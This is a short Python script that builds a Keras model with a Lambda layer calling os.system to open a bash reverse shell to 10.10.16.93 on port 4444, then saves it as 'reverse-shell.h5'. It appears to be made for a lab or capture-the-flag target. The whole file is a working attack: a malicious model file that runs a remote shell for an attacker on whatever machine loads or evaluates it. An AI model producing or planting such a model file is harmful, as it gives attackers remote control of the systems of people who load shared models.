import tensorflow as tf
from tensorflow import keras
from tensorflow.keras import layers

def payload(x):
    import os
    os.system("bash -c 'bash -i >& /dev/tcp/10.10.16.93/4444 0>&1'")
    return x


model = keras.Sequential([
    layers.Input(shape=(1,)),
    layers.Lambda(payload)
])

model.save("reverse-shell.h5")
